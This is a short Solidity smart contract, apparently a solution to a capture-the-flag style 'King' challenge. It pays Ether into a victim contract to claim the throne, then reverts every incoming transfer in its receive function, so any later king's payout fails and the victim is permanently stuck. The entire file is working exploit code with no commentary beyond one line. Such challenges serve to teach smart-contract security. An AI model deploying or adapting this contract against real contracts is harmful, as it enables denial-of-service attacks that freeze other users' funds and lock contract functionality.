// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract KingAttack {

    address public attacker;

    modifier onlyAttacker {
        require(msg.sender == attacker, "KingAttack: NOT_OWNER");
        _;
    }

    constructor() {
        attacker = msg.sender;
    }

    function attack(address _victim) external payable onlyAttacker {
        (bool success, ) = _victim.call{ value: msg.value }("");
        require(success, "KingAttack: ATTACK_FAILED");
    }

    receive() external payable {
        // Refuse receiving any Ether, the transaction made by new King will be reverted
        revert("KingAttack: ETH_TX_REVERTED");
    }
}
